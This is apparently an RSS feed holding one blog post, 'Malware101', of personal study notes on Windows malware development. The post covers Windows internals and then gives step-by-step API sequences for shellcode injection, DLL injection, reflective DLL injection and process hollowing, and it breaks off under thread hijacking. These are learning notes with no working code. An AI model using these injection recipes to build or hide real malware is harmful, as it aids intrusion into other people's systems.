<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ceald&#39;s blog</title>
    <link>//localhost:1313/</link>
    <description>Recent content on Ceald&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Fri, 14 Nov 2025 18:20:01 -0700</lastBuildDate><atom:link href="//localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Malware101</title>
      <link>//localhost:1313/posts/malware101/</link>
      <pubDate>Fri, 14 Nov 2025 18:20:01 -0700</pubDate>
      
      <guid>//localhost:1313/posts/malware101/</guid>
      <description>malware notes</description>
      <content>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;My notes while learning malware development for Windows.&lt;/p&gt;
&lt;h1 id=&#34;malware-types&#34;&gt;Malware types&lt;/h1&gt;
&lt;h2 id=&#34;notes&#34;&gt;Notes:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Sophisticated malware will be able to detect tools trying to analyze it by checking processes running or if it&amp;rsquo;s in a virtual machine.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;rat&#34;&gt;RAT&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;persistent connection to a machine to monitor things like key strokes.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;infostealers&#34;&gt;Infostealers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;targets sensitive information like medical records or banking information&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;droppers-and-loaders&#34;&gt;Droppers and loaders&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Deploy additional malware through a web request.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ransomware&#34;&gt;Ransomware&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Denies access to a person&amp;rsquo;s computer for a ransom.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;wipers&#34;&gt;Wipers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Destroys sensitive information or entire systems.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;worms&#34;&gt;Worms&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Self spreading malware.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;viruses&#34;&gt;Viruses&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Adds malicious code onto a host system&amp;rsquo;s files.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;rootkits-and-bootkits&#34;&gt;Rootkits and Bootkits&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Malware that conceals itself in the kernel or in the BIOS. Rootkits run at system startup while Bootkits start at boot time.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;trojans&#34;&gt;Trojans&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Pretends to be legit programs to infect a system.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;windows-101&#34;&gt;Windows 101&lt;/h1&gt;
&lt;h2 id=&#34;conceptsessentials&#34;&gt;Concepts/Essentials&lt;/h2&gt;
&lt;h3 id=&#34;user-mode-vs-kernel-mode&#34;&gt;User mode vs Kernel mode&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/kernel_user_mode.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;windows-apiwinapi&#34;&gt;Windows API/WinAPI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;various functions for programs to interact with to function&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;drivers&#34;&gt;Drivers&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Provide an abstraction layer between the actual kernel and user (kernel level anti cheats are drivers)&lt;/li&gt;
&lt;li&gt;Drivers can be ran in user mode or Kernel mode&lt;/li&gt;
&lt;li&gt;Kernel mode have FULL access to the kernel&lt;/li&gt;
&lt;li&gt;User mode drivers are restricted&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hardware-abstraction-layer&#34;&gt;Hardware abstraction Layer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Interface for hardware to interact with the rest of the system.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;kernel&#34;&gt;Kernel&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Kernel is the &amp;ldquo;magic&amp;rdquo; of this system by having the utilities for everything to communicate and run (somewhat) effectively by handling memory management and other complex tasks.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;processes-and-threads&#34;&gt;Processes and Threads&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Processes are applications&lt;/li&gt;
&lt;li&gt;Threads are instructions for that process (processes can have more than one thread)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;objects-and-handles&#34;&gt;Objects and Handles&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Objects are resources like resources (files, tokens, another process, or thread)&lt;/li&gt;
&lt;li&gt;Handles are identifiers for those processes or objects a program is trying to access
&lt;img src=&#34;//localhost:1313/malware101/handles_objects.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;li&gt;Mutexe (Mutual exclusions) control access to objects to prevent system crashes or other issues.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;windows-api&#34;&gt;Windows API&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WinAPI is a library of various functions&lt;/li&gt;
&lt;li&gt;API helps with things from security authentication to even showing a message box&lt;/li&gt;
&lt;li&gt;Docs are notoriously bad&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;windows-native-api&#34;&gt;Windows Native API&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;a lower level windows API&lt;/li&gt;
&lt;li&gt;undocumented by MS
&lt;a href=&#34;http://undocumented.ntinternals.net/&#34;&gt;http://undocumented.ntinternals.net/&lt;/a&gt;
&lt;a href=&#34;https://www.geoffchappell.com/studies/windows/win32/ntdll/api/native.htm&#34;&gt;https://www.geoffchappell.com/studies/windows/win32/ntdll/api/native.htm&lt;/a&gt;
&lt;img src=&#34;//localhost:1313/malware101/api.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;api-functions&#34;&gt;API Functions:&lt;/h4&gt;
&lt;h5 id=&#34;notes-1&#34;&gt;Notes&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;API functions have various suffixes.
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ex&lt;/code&gt; means newer&lt;/li&gt;
&lt;li&gt;&lt;code&gt;A&lt;/code&gt; outputs and inputs in ANSI format (&lt;a href=&#34;https://ansi.tools/&#34;&gt;https://ansi.tools/&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;W&lt;/code&gt; outputs and inputs in unicode format (&lt;a href=&#34;https://gist.github.com/jpassaro/bf400b0410810a071a7fb3509ef6c2c3&#34;&gt;https://gist.github.com/jpassaro/bf400b0410810a071a7fb3509ef6c2c3&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Native API functions have prefixes.  &lt;a href=&#34;https://stackoverflow.com/questions/4770553/windows-native-api-when-and-why-use-zw-vs-nt-prefixed-api-calls#4770583&#34;&gt;https://stackoverflow.com/questions/4770553/windows-native-api-when-and-why-use-zw-vs-nt-prefixed-api-calls#4770583&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Zw&lt;/code&gt; are for kernel mode drivers&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Nt&lt;/code&gt; are for user mode applications&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DLLs are libraries that contain these functions
&lt;ul&gt;
&lt;li&gt;kernel32.dll
&lt;ul&gt;
&lt;li&gt;Contains fundamental user mode functions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;user32.dll
&lt;ul&gt;
&lt;li&gt;For gui applications&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Winhttp.dll
&lt;ul&gt;
&lt;li&gt;For internet functions for windows programs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ntdll.dll
&lt;ul&gt;
&lt;li&gt;Synchronization, threading and other system tasks that communicate with the kernel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;kernelbase.dll
&lt;ul&gt;
&lt;li&gt;For backwards compatibility for windows apps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;process-internals&#34;&gt;Process Internals&lt;/h3&gt;
&lt;p&gt;Processes point to additional data structures. It provides additional information for windows to understand and manage processes&lt;/p&gt;
&lt;h4 id=&#34;eprocess-structure&#34;&gt;EPROCESS Structure&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/eprocess.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This is how windows processes are understood by the kernel.&lt;/li&gt;
&lt;li&gt;EPROCESS structures:
&lt;ul&gt;
&lt;li&gt;PEB (process environment block)
&lt;ul&gt;
&lt;li&gt;contains essential information for the process&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Forward Links (Flink)
&lt;ul&gt;
&lt;li&gt;chains to the Blink&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Backward Links (Blink)
&lt;ul&gt;
&lt;li&gt;links backwards to the Flink&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Links just link processes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;peb-structure-offsets-and-data&#34;&gt;PEB Structure Offsets and Data&lt;/h4&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Offset (x86)&lt;/th&gt;
          &lt;th&gt;Offset (x64)&lt;/th&gt;
          &lt;th&gt;Data&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0x002&lt;/td&gt;
          &lt;td&gt;0x002&lt;/td&gt;
          &lt;td&gt;Stores the BeingDebugged value, which indicates whether the process is running under the context of a debugger.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0x008&lt;/td&gt;
          &lt;td&gt;0x10&lt;/td&gt;
          &lt;td&gt;Stores the base address of the process executable in memory.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0x00C&lt;/td&gt;
          &lt;td&gt;0x18&lt;/td&gt;
          &lt;td&gt;Stores information on the modules and libraries the process has loaded.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0x018&lt;/td&gt;
          &lt;td&gt;0x30&lt;/td&gt;
          &lt;td&gt;Stores information about the process’s memory heap.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0x064&lt;/td&gt;
          &lt;td&gt;0xB8&lt;/td&gt;
          &lt;td&gt;Stores the NumberOfProcessors value, which indicates the number of processors the system has.&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;teb-thread-environment-block-aka-tib-thread-information-block&#34;&gt;TEB (Thread Environment Block aka TIB Thread Information Block)&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Contains Information for process&amp;rsquo;s running threads&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Offset (x86)&lt;/th&gt;
          &lt;th&gt;Offset (x64)&lt;/th&gt;
          &lt;th&gt;Data&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;FS:[0x00]&lt;/td&gt;
          &lt;td&gt;GS:[0x00]&lt;/td&gt;
          &lt;td&gt;Stores the current structured exception handler (SEH) frame.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;FS:[0x04]&lt;/td&gt;
          &lt;td&gt;GS:[0x08]&lt;/td&gt;
          &lt;td&gt;Points to the base of the thread’s stack.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;FS:[0x18]&lt;/td&gt;
          &lt;td&gt;GS:[0x30]&lt;/td&gt;
          &lt;td&gt;Points to the TEB itself.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;FS:[0x20]&lt;/td&gt;
          &lt;td&gt;GS:[0x40]&lt;/td&gt;
          &lt;td&gt;Stores the process ID (PID) of the thread’s owning process.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;FS:[0x24]&lt;/td&gt;
          &lt;td&gt;GS:[0x48]&lt;/td&gt;
          &lt;td&gt;Stores the thread ID (TID) of the current thread.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;FS:[0x30]&lt;/td&gt;
          &lt;td&gt;GS:[0x60]&lt;/td&gt;
          &lt;td&gt;Points to the PEB of the thread’s owning process.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;FS:[0xE10]&lt;/td&gt;
          &lt;td&gt;GS:[0x1480]&lt;/td&gt;
          &lt;td&gt;Points to thread-local storage (TLS) information.&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;stacks-and-heaps&#34;&gt;Stacks and Heaps&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Stack is where temporary data is stored (destroyed after a thread is done)&lt;/li&gt;
&lt;li&gt;Heap is a large region used to dynamically store memory at runtime (global variables, etc.)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;virtual-memory&#34;&gt;Virtual Memory&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;In windows processes have virtual memory allocated to them that are mapped to the RAM&lt;/li&gt;
&lt;li&gt;Solves process interference or programs crashing
&lt;img src=&#34;//localhost:1313/malware101/pager.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;li&gt;If a process has too little RAM for a process it&amp;rsquo;ll page/store it on disk (like a Linux swapfile or partition)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;pe-files&#34;&gt;PE Files&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Essentially the windows version of &lt;code&gt;elf&lt;/code&gt; files&lt;/li&gt;
&lt;li&gt;Contain headers and sections
&lt;ul&gt;
&lt;li&gt;Headers are metadata&lt;/li&gt;
&lt;li&gt;DOS Headers are for older versions of windows&lt;/li&gt;
&lt;li&gt;PE header contains information used by the Windows PE Loader&lt;/li&gt;
&lt;li&gt;Section header contains metadata related to file sections (size, address, etc.)&lt;/li&gt;
&lt;li&gt;Common sections in table bellow&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Section&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;.text&lt;/td&gt;
          &lt;td&gt;The file’s main executable code&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.rdata&lt;/td&gt;
          &lt;td&gt;Read-only data, such as static variables and constants&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.bss&lt;/td&gt;
          &lt;td&gt;Uninitialized data, such as variables that haven’t been assigned a value yet&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.data&lt;/td&gt;
          &lt;td&gt;Variables not embedded in the .rdata and .bss sections, such as global variables&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.rsrc&lt;/td&gt;
          &lt;td&gt;Assets that will be loaded by the executable at runtime, such as images, fonts, and other supporting files&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.idata&lt;/td&gt;
          &lt;td&gt;The imports address table&lt;!-- raw HTML omitted --&gt;* information about imports used by the PE file&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.edata&lt;/td&gt;
          &lt;td&gt;The exports address table&lt;!-- raw HTML omitted --&gt;* information about exports used by the PE file&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;pe-loading-process&#34;&gt;PE Loading Process&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Windows makes a new EPROCESS structure&lt;/li&gt;
&lt;li&gt;Windows allocates virtual memory to the process&lt;/li&gt;
&lt;li&gt;PE Loader reads and parses the DOS, PE, and optional headers&lt;/li&gt;
&lt;li&gt;PE Parses all the other headers&lt;/li&gt;
&lt;li&gt;Loads libraries associated with the PE (&lt;code&gt;.idata&lt;/code&gt; and or &lt;code&gt;.rdata&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;New thread is created inside the process (&lt;code&gt;.text&lt;/code&gt; section)
&lt;img src=&#34;//localhost:1313/malware101/pe.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;address-space-layout-randomization-aslr&#34;&gt;Address Space Layout Randomization (ASLR)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;prevents memory corruption&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;registry&#34;&gt;Registry&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A database that applications and the OS reads and stores configurations&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;hives&#34;&gt;Hives&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;HKEY_LOCAL_MACHINE (HKLM)
&lt;ul&gt;
&lt;li&gt;Low level OS&lt;/li&gt;
&lt;li&gt;Hardware configurations&lt;/li&gt;
&lt;li&gt;Security Policies&lt;/li&gt;
&lt;li&gt;Account settings&lt;/li&gt;
&lt;li&gt;Settings for software installed&lt;/li&gt;
&lt;li&gt;SAM database&lt;/li&gt;
&lt;li&gt;LSA Secrets&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HKEY_CURRENT_USER (HKCU)
&lt;ul&gt;
&lt;li&gt;user and system configurations&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HKEY_USERS (HKU)
&lt;ul&gt;
&lt;li&gt;User settings&lt;/li&gt;
&lt;li&gt;Stores the information for every user on the system&lt;/li&gt;
&lt;li&gt;Sub keys represent identifiers of every user&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HKEY_CURRENT_CONFIG (HKCC)
&lt;ul&gt;
&lt;li&gt;Pounters to the &lt;code&gt;HKLM&lt;/code&gt; key for hardware profiles&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HKEY_CLASSES_ROOT (HKCR)
&lt;ul&gt;
&lt;li&gt;registered application information like default apps to open files&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;evasion-techniques&#34;&gt;Evasion techniques&lt;/h1&gt;
&lt;h2 id=&#34;process-injection&#34;&gt;Process Injection&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Injecting code into another process&lt;/li&gt;
&lt;li&gt;Mimics normal behavior like injecting into a web browser to communicate with a C2 server&lt;/li&gt;
&lt;li&gt;prevents debugging&lt;/li&gt;
&lt;li&gt;privilege escalation, certain processes can elevate privileges&lt;/li&gt;
&lt;li&gt;intercepting data from a hook, this allows for modifying API calls or getting sensitive data.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;random-vs-target-process&#34;&gt;Random vs Target Process&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Depending on injecting into a specific process or a random one is goals.&lt;/li&gt;
&lt;li&gt;Targeting specific processes can help with evasion while random ones can trip defenses&lt;/li&gt;
&lt;li&gt;Self-injecting is injecting into its own process, typically during unpacking.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;shellcode-injection&#34;&gt;Shellcode Injection&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/shellcode_injection.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;shellcode injection happens by injecting shell code into a process.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;call &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&#34;&gt;&lt;code&gt;OpenProcess&lt;/code&gt;&lt;/a&gt;/&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess&#34;&gt;&lt;code&gt;NtOpenProcess&lt;/code&gt;&lt;/a&gt; to open a process and specify the proper options&lt;/li&gt;
&lt;li&gt;After getting the object handle run either &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&#34;&gt;&lt;code&gt;VirtualAlloc&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&#34;&gt;&lt;code&gt;VirtualAllocEx&lt;/code&gt;&lt;/a&gt;, or &lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory&#34;&gt;&lt;code&gt;NtAllocateVirtualMemory&lt;/code&gt;&lt;/a&gt; to allocate enough memory for your shellcode.&lt;/li&gt;
&lt;li&gt;Write the memory to the process with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&#34;&gt;&lt;code&gt;WriteProcessMemory&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://ntdoc.m417z.com/ntwritevirtualmemory&#34;&gt;&lt;code&gt;NtWriteVirtualMemory&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Call &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&#34;&gt;&lt;code&gt;CreateRemoteThread&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://ntdoc.m417z.com/ntcreatethreadex&#34;&gt;&lt;code&gt;NtCreateThreadEx&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://ntdoc.m417z.com/rtlcreateuserthread&#34;&gt;&lt;code&gt;RtlCreateUserThread&lt;/code&gt;&lt;/a&gt; and input the proper options.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;dll-injection&#34;&gt;DLL Injection&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/dll_injection.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Common form of process injection by using libraries to inject code once it&amp;rsquo;s loaded&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;add malicious DLL to disk&lt;/li&gt;
&lt;li&gt;call &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&#34;&gt;&lt;code&gt;OpenProcess&lt;/code&gt;&lt;/a&gt;/&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess&#34;&gt;&lt;code&gt;NtOpenProcess&lt;/code&gt;&lt;/a&gt; to open a process and specify the proper options&lt;/li&gt;
&lt;li&gt;After getting the object handle run either &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&#34;&gt;&lt;code&gt;VirtualAlloc&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&#34;&gt;&lt;code&gt;VirtualAllocEx&lt;/code&gt;&lt;/a&gt;, or &lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory&#34;&gt;&lt;code&gt;NtAllocateVirtualMemory&lt;/code&gt;&lt;/a&gt; to allocate enough memory.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&#34;&gt;&lt;code&gt;WriteProcessMemory&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://ntdoc.m417z.com/ntwritevirtualmemory&#34;&gt;&lt;code&gt;NtWriteVirtualMemory&lt;/code&gt;&lt;/a&gt; to write the location of the DLL.&lt;/li&gt;
&lt;li&gt;Call &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&#34;&gt;&lt;code&gt;CreateRemoteThread&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://ntdoc.m417z.com/ntcreatethreadex&#34;&gt;&lt;code&gt;NtCreateThreadEx&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://ntdoc.m417z.com/rtlcreateuserthread&#34;&gt;&lt;code&gt;RtlCreateUserThread&lt;/code&gt;&lt;/a&gt; and input the proper options to get the process to read the DLL with &lt;code&gt;LoadLibrary&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;reflective-dll-injection&#34;&gt;Reflective DLL Injection&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/reflective_dll.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DLLs are injected through being stored in memory instead of  on the disk&lt;/li&gt;
&lt;li&gt;Write the DLL to the memory and transfer the control flow into the new injected DLL.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/reflective_dll_inject.rb&#34;&gt;example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;process-hollowingrunpe&#34;&gt;Process Hollowing/RunPE&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/malware101/process_hallowing.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un-maps code from a target&amp;rsquo;s process memory&lt;/li&gt;
&lt;li&gt;Doesn&amp;rsquo;t use an arbitrary remote process, starts a new process instead.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Create a new process with &lt;code&gt;CreateProcess&lt;/code&gt; (&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa&#34;&gt;&lt;code&gt;CreateProcessA&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&#34;&gt;&lt;code&gt;CreateProcessW&lt;/code&gt;&lt;/a&gt;) with the flag &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags&#34;&gt;&lt;code&gt;CREATE_SUSPENDED&lt;/code&gt;&lt;/a&gt; or &lt;code&gt;0x00000004&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Unmap the process&amp;rsquo;s code with &lt;a href=&#34;https://ntdoc.m417z.com/ntunmapviewofsection&#34;&gt;&lt;code&gt;NtUnmapViewOfSection&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Allocate memory for the new region with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&#34;&gt;&lt;code&gt;VirtualAlloc&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;write the payload with &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&#34;&gt;&lt;code&gt;WriteProcessMemory&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;use &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext&#34;&gt;&lt;code&gt;SetThreadContext&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread&#34;&gt;&lt;code&gt;ResumeThread&lt;/code&gt;&lt;/a&gt; to point the thread to the new injected code and to resume thread execution.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;thread-hijacking&#34;&gt;Thread Hijacking&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Opening a new thread within a target process to run code.&lt;/li&gt;
&lt;li&gt;Similar to Process Hollowing&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
